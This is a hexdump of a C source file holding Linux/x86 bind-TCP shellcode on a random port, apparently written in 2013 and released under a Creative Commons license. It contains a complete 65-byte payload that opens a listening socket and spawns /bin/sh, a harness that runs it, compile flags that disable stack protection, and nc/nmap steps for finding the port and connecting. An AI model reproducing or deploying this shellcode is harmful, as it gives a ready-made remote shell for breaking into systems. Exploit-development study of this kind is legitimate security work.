00000000  2f 2a 0d 0a 0d 0a 20 53  68 65 6c 6c 20 42 69 6e  |/*.... Shell Bin|
00000010  64 20 54 43 50 20 52 61  6e 64 6f 6d 20 50 6f 72  |d TCP Random Por|
00000020  74 20 53 68 65 6c 6c 63  6f 64 65 20 2d 20 43 20  |t Shellcode - C |
00000030  4c 61 6e 67 75 61 67 65  0d 0a 20 4c 69 6e 75 78  |Language.. Linux|
00000040  2f 78 38 36 0d 0a 0d 0a  20 57 72 69 74 74 65 6e  |/x86.... Written|
00000050  20 69 6e 20 32 30 31 33  20 62 79 20 47 65 79 73  | in 2013 by Geys|
00000060  6c 61 6e 20 47 2e 20 42  65 6d 2c 20 48 61 63 6b  |lan G. Bem, Hack|
00000070  69 6e 67 20 62 69 74 73  0d 0a 0d 0a 20 20 20 68  |ing bits....   h|
00000080  74 74 70 3a 2f 2f 68 61  63 6b 69 6e 67 62 69 74  |ttp://hackingbit|
00000090  73 2e 63 6f 6d 0d 0a 20  20 20 67 65 79 73 6c 61  |s.com..   geysla|
000000a0  6e 40 67 6d 61 69 6c 2e  63 6f 6d 0d 0a 0d 0a 20  |n@gmail.com.... |
000000b0  57 69 74 68 20 74 68 65  20 67 72 65 61 74 20 73  |With the great s|
000000c0  75 70 70 6f 72 74 20 66  72 6f 6d 20 54 69 61 67  |upport from Tiag|
000000d0  6f 20 4e 61 74 65 6c 2c  20 53 65 63 20 50 6c 75  |o Natel, Sec Plu|
000000e0  73 0d 0a 0d 0a 20 20 20  68 74 74 70 3a 2f 2f 77  |s....   http://w|
000000f0  77 77 2e 73 65 63 70 6c  75 73 2e 63 6f 6d 2e 62  |ww.secplus.com.b|
00000100  72 2f 0d 0a 20 20 20 74  69 61 67 6f 34 6f 72 69  |r/..   tiago4ori|
00000110  6f 6e 40 67 6d 61 69 6c  2e 63 6f 6d 0d 0a 0d 0a  |on@gmail.com....|
00000120  20 54 68 69 73 20 73 6f  75 72 63 65 20 69 73 20  | This source is |
00000130  6c 69 63 65 6e 73 65 64  20 75 6e 64 65 72 20 74  |licensed under t|
00000140  68 65 20 43 72 65 61 74  69 76 65 20 43 6f 6d 6d  |he Creative Comm|
00000150  6f 6e 73 0d 0a 20 41 74  74 72 69 62 75 74 69 6f  |ons.. Attributio|
00000160  6e 2d 53 68 61 72 65 41  6c 69 6b 65 20 33 2e 30  |n-ShareAlike 3.0|
00000170  20 42 72 61 7a 69 6c 20  4c 69 63 65 6e 73 65 2e  | Brazil License.|
00000180  0d 0a 0d 0a 20 54 6f 20  76 69 65 77 20 61 20 63  |.... To view a c|
00000190  6f 70 79 20 6f 66 20 74  68 69 73 20 6c 69 63 65  |opy of this lice|
000001a0  6e 73 65 2c 20 76 69 73  69 74 0d 0a 0d 0a 20 20  |nse, visit....  |
000001b0  20 68 74 74 70 3a 2f 2f  63 72 65 61 74 69 76 65  | http://creative|
000001c0  63 6f 6d 6d 6f 6e 73 2e  6f 72 67 2f 6c 69 63 65  |commons.org/lice|
000001d0  6e 73 65 73 2f 62 79 2d  73 61 2f 33 2e 30 2f 0d  |nses/by-sa/3.0/.|
000001e0  0a 0d 0a 20 59 6f 75 20  61 72 65 20 66 72 65 65  |... You are free|
000001f0  3a 0d 0a 0d 0a 20 20 20  20 74 6f 20 53 68 61 72  |:....    to Shar|
00000200  65 20 2d 20 74 6f 20 63  6f 70 79 2c 20 64 69 73  |e - to copy, dis|
00000210  74 72 69 62 75 74 65 20  61 6e 64 20 74 72 61 6e  |tribute and tran|
00000220  73 6d 69 74 20 74 68 65  20 77 6f 72 6b 0d 0a 20  |smit the work.. |
00000230  20 20 20 74 6f 20 52 65  6d 69 78 20 2d 20 74 6f  |   to Remix - to|
00000240  20 61 64 61 70 74 20 74  68 65 20 77 6f 72 6b 0d  | adapt the work.|
00000250  0a 20 20 20 20 74 6f 20  6d 61 6b 65 20 63 6f 6d  |.    to make com|
00000260  6d 65 72 63 69 61 6c 20  75 73 65 20 6f 66 20 74  |mercial use of t|
00000270  68 65 20 77 6f 72 6b 0d  0a 0d 0a 20 55 6e 64 65  |he work.... Unde|
00000280  72 20 74 68 65 20 66 6f  6c 6c 6f 77 69 6e 67 20  |r the following |
00000290  63 6f 6e 64 69 74 69 6f  6e 73 3a 0d 0a 20 20 20  |conditions:..   |
000002a0  41 74 74 72 69 62 75 74  69 6f 6e 20 2d 20 59 6f  |Attribution - Yo|
000002b0  75 20 6d 75 73 74 20 61  74 74 72 69 62 75 74 65  |u must attribute|
000002c0  20 74 68 65 20 77 6f 72  6b 20 69 6e 20 74 68 65  | the work in the|
000002d0  20 6d 61 6e 6e 65 72 0d  0a 20 20 20 20 20 20 20  | manner..       |
000002e0  20 20 20 20 20 20 20 20  20 20 73 70 65 63 69 66  |          specif|
000002f0  69 65 64 20 62 79 20 74  68 65 20 61 75 74 68 6f  |ied by the autho|
00000300  72 20 6f 72 20 6c 69 63  65 6e 73 6f 72 20 28 62  |r or licensor (b|
00000310  75 74 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |ut..            |
00000320  20 20 20 20 20 6e 6f 74  20 69 6e 20 61 6e 79 20  |     not in any |
00000330  77 61 79 20 74 68 61 74  20 73 75 67 67 65 73 74  |way that suggest|
00000340  73 20 74 68 61 74 20 74  68 65 79 0d 0a 20 20 20  |s that they..   |
00000350  20 20 20 20 20 20 20 20  20 20 20 20 20 20 65 6e  |              en|
00000360  64 6f 72 73 65 20 79 6f  75 20 6f 72 20 79 6f 75  |dorse you or you|
00000370  72 20 75 73 65 20 6f 66  20 74 68 65 20 77 6f 72  |r use of the wor|
00000380  6b 29 2e 0d 0a 0d 0a 20  20 20 53 68 61 72 65 20  |k).....   Share |
00000390  41 6c 69 6b 65 20 2d 20  49 66 20 79 6f 75 20 61  |Alike - If you a|
000003a0  6c 74 65 72 2c 20 74 72  61 6e 73 66 6f 72 6d 2c  |lter, transform,|
000003b0  20 6f 72 20 62 75 69 6c  64 20 75 70 6f 6e 0d 0a  | or build upon..|
000003c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000003d0  20 74 68 69 73 20 77 6f  72 6b 2c 20 79 6f 75 20  | this work, you |
000003e0  6d 61 79 20 64 69 73 74  72 69 62 75 74 65 20 74  |may distribute t|
000003f0  68 65 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |he..            |
00000400  20 20 20 20 20 72 65 73  75 6c 74 69 6e 67 20 77  |     resulting w|
00000410  6f 72 6b 20 6f 6e 6c 79  20 75 6e 64 65 72 20 74  |ork only under t|
00000420  68 65 20 73 61 6d 65 20  6f 72 0d 0a 20 20 20 20  |he same or..    |
00000430  20 20 20 20 20 20 20 20  20 20 20 20 20 73 69 6d  |             sim|
00000440  69 6c 61 72 20 6c 69 63  65 6e 73 65 20 74 6f 20  |ilar license to |
00000450  74 68 69 73 20 6f 6e 65  2e 0d 0a 0d 0a 2a 2f 0d  |this one.....*/.|
00000460  0a 0d 0a 2f 2a 0d 0a 0d  0a 20 73 68 65 6c 6c 5f  |.../*.... shell_|
00000470  62 69 6e 64 5f 74 63 70  5f 72 61 6e 64 6f 6d 5f  |bind_tcp_random_|
00000480  70 6f 72 74 5f 73 68 65  6c 6c 63 6f 64 65 0d 0a  |port_shellcode..|
00000490  0d 0a 20 2a 20 36 35 20  62 79 74 65 73 0d 0a 20  |.. * 65 bytes.. |
000004a0  2a 20 6e 75 6c 6c 2d 62  79 74 65 73 20 66 72 65  |* null-bytes fre|
000004b0  65 0d 0a 20 2a 20 74 68  65 20 70 6f 72 74 20 6e  |e.. * the port n|
000004c0  75 6d 62 65 72 20 69 73  20 73 65 74 20 62 79 20  |umber is set by |
000004d0  74 68 65 20 73 79 73 74  65 6d 20 61 6e 64 20 63  |the system and c|
000004e0  61 6e 20 62 65 20 64 69  73 63 6f 76 65 72 65 64  |an be discovered|
000004f0  20 75 73 69 6e 67 20 6e  6d 61 70 0d 0a 20 20 20  | using nmap..   |
00000500  28 73 65 65 20 68 74 74  70 3a 2f 2f 6d 61 6e 75  |(see http://manu|
00000510  61 6c 73 2e 74 73 2e 66  75 6a 69 74 73 75 2e 63  |als.ts.fujitsu.c|
00000520  6f 6d 2f 66 69 6c 65 2f  34 36 38 36 2f 70 6f 73  |om/file/4686/pos|
00000530  69 78 5f 73 2e 70 64 66  2c 20 70 61 67 65 20 32  |ix_s.pdf, page 2|
00000540  33 2c 20 73 65 63 74 69  6f 6e 20 32 2e 36 2e 36  |3, section 2.6.6|
00000550  29 0d 0a 0d 0a 0d 0a 20  23 20 67 63 63 20 2d 6d  |)...... # gcc -m|
00000560  33 32 20 2d 66 6e 6f 2d  73 74 61 63 6b 2d 70 72  |32 -fno-stack-pr|
00000570  6f 74 65 63 74 6f 72 20  2d 7a 20 65 78 65 63 73  |otector -z execs|
00000580  74 61 63 6b 20 73 68 65  6c 6c 5f 62 69 6e 64 5f  |tack shell_bind_|
00000590  74 63 70 5f 72 61 6e 64  6f 6d 5f 70 6f 72 74 5f  |tcp_random_port_|
000005a0  73 68 65 6c 6c 63 6f 64  65 2e 63 20 2d 6f 20 73  |shellcode.c -o s|
000005b0  68 65 6c 6c 5f 62 69 6e  64 5f 74 63 70 5f 72 61  |hell_bind_tcp_ra|
000005c0  6e 64 6f 6d 5f 70 6f 72  74 5f 73 68 65 6c 6c 63  |ndom_port_shellc|
000005d0  6f 64 65 0d 0a 20 23 20  2e 2f 73 68 65 6c 6c 5f  |ode.. # ./shell_|
000005e0  62 69 6e 64 5f 74 63 70  5f 72 61 6e 64 6f 6d 5f  |bind_tcp_random_|
000005f0  70 6f 72 74 5f 73 68 65  6c 6c 63 6f 64 65 0d 0a  |port_shellcode..|
00000600  0d 0a 20 54 65 73 74 69  6e 67 0d 0a 20 23 20 6e  |.. Testing.. # n|
00000610  65 74 73 74 61 74 20 2d  61 6e 70 20 7c 20 67 72  |etstat -anp | gr|
00000620  65 70 20 73 68 65 6c 6c  0d 0a 20 23 20 6e 6d 61  |ep shell.. # nma|
00000630  70 20 2d 73 53 20 31 32  37 2e 30 2e 30 2e 31 20  |p -sS 127.0.0.1 |
00000640  2d 70 2d 20 20 28 49 74  27 73 20 6e 65 63 65 73  |-p-  (It's neces|
00000650  73 61 72 79 20 74 6f 20  75 73 65 20 74 68 65 20  |sary to use the |
00000660  54 43 50 20 53 59 4e 20  73 63 61 6e 20 6f 70 74  |TCP SYN scan opt|
00000670  69 6f 6e 20 5b 2d 73 53  5d 3b 20 74 68 75 73 20  |ion [-sS]; thus |
00000680  61 76 6f 69 64 73 20 74  68 61 74 20 6e 6d 61 70  |avoids that nmap|
00000690  20 63 6f 6e 6e 65 63 74  73 20 74 6f 20 74 68 65  | connects to the|
000006a0  20 70 6f 72 74 20 6f 70  65 6e 20 62 79 20 73 68  | port open by sh|
000006b0  65 6c 6c 63 6f 64 65 29  0d 0a 20 23 20 6e 63 20  |ellcode).. # nc |
000006c0  31 32 37 2e 30 2e 30 2e  31 20 70 6f 72 74 0d 0a  |127.0.0.1 port..|
000006d0  0d 0a 2a 2f 0d 0a 0d 0a  23 69 6e 63 6c 75 64 65  |..*/....#include|
000006e0  20 3c 73 74 64 69 6f 2e  68 3e 0d 0a 23 69 6e 63  | <stdio.h>..#inc|
000006f0  6c 75 64 65 20 3c 73 74  72 69 6e 67 2e 68 3e 0d  |lude <string.h>.|
00000700  0a 0d 0a 75 6e 73 69 67  6e 65 64 20 63 68 61 72  |...unsigned char|
00000710  20 63 6f 64 65 5b 5d 20  3d 20 5c 0d 0a 0d 0a 22  | code[] = \...."|
00000720  5c 78 36 61 5c 78 36 36  5c 78 35 38 5c 78 39 39  |\x6a\x66\x58\x99|
00000730  5c 78 36 61 5c 78 30 31  5c 78 35 62 5c 78 35 32  |\x6a\x01\x5b\x52|
00000740  5c 78 35 33 5c 78 36 61  5c 78 30 32 5c 78 38 39  |\x53\x6a\x02\x89|
00000750  22 0d 0a 22 5c 78 65 31  5c 78 63 64 5c 78 38 30  |".."\xe1\xcd\x80|
00000760  5c 78 38 39 5c 78 63 36  5c 78 35 66 5c 78 62 30  |\x89\xc6\x5f\xb0|
00000770  5c 78 36 36 5c 78 62 33  5c 78 30 34 5c 78 35 32  |\x66\xb3\x04\x52|
00000780  5c 78 35 36 22 0d 0a 22  5c 78 38 39 5c 78 65 31  |\x56".."\x89\xe1|
00000790  5c 78 63 64 5c 78 38 30  5c 78 62 30 5c 78 36 36  |\xcd\x80\xb0\x66|
000007a0  5c 78 34 33 5c 78 38 39  5c 78 35 34 5c 78 32 34  |\x43\x89\x54\x24|
000007b0  5c 78 30 38 5c 78 63 64  22 0d 0a 22 5c 78 38 30  |\x08\xcd".."\x80|
000007c0  5c 78 39 33 5c 78 35 39  5c 78 62 30 5c 78 33 66  |\x93\x59\xb0\x3f|
000007d0  5c 78 63 64 5c 78 38 30  5c 78 34 39 5c 78 37 39  |\xcd\x80\x49\x79|
000007e0  5c 78 66 39 5c 78 62 30  5c 78 30 62 22 0d 0a 22  |\xf9\xb0\x0b".."|
000007f0  5c 78 35 32 5c 78 36 38  5c 78 32 66 5c 78 32 66  |\x52\x68\x2f\x2f|
00000800  5c 78 37 33 5c 78 36 38  5c 78 36 38 5c 78 32 66  |\x73\x68\x68\x2f|
00000810  5c 78 36 32 5c 78 36 39  5c 78 36 65 5c 78 38 39  |\x62\x69\x6e\x89|
00000820  22 0d 0a 22 5c 78 65 33  5c 78 35 32 5c 78 35 33  |".."\xe3\x52\x53|
00000830  5c 78 65 62 5c 78 63 61  22 3b 0d 0a 0d 0a 6d 61  |\xeb\xca";....ma|
00000840  69 6e 20 28 29 0d 0a 7b  0d 0a 0d 0a 09 70 72 69  |in ()..{.....pri|
00000850  6e 74 66 28 22 53 68 65  6c 6c 63 6f 64 65 20 4c  |ntf("Shellcode L|
00000860  65 6e 67 74 68 3a 20 20  25 64 5c 6e 22 2c 20 73  |ength:  %d\n", s|
00000870  74 72 6c 65 6e 28 63 6f  64 65 29 29 3b 0d 0a 0d  |trlen(code));...|
00000880  0a 09 69 6e 74 20 28 2a  72 65 74 29 28 29 20 3d  |..int (*ret)() =|
00000890  20 28 69 6e 74 28 2a 29  28 29 29 63 6f 64 65 3b  | (int(*)())code;|
000008a0  0d 0a 0d 0a 09 72 65 74  28 29 3b 0d 0a 0d 0a 7d  |.....ret();....}|
000008b0
